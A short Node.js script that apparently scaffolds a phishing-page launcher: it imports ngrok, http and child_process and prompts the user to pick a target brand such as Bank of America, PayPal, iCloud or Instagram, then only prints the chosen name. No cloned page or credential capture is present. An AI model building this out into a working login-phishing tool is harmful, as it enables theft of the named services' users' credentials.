#!/usr/bin/node

'use strict';

const fs = require('fs');
const http = require('http');
const ngrok = require('ngrok');
const inquirer = require('inquirer');
const { exec } = require('child_process');

inquirer
	.prompt([
		{
			type: 'list',
			name: 'websiteOption',
			message: 'Please choose a website',
			choices: [
				'Amazon',
				'Bank Of America',
				'Google',
				'iCloud',
				'Instagram',
				'LinkedIn',
				'PNC',
				'Royal Credit Union',
				'PayPal',
			],
		},
	])
	.then((answer) => {
		const ans = answer['websiteOption'];

		const website = ans.split(' ').join('').toLowerCase();

		console.log(website);
	});
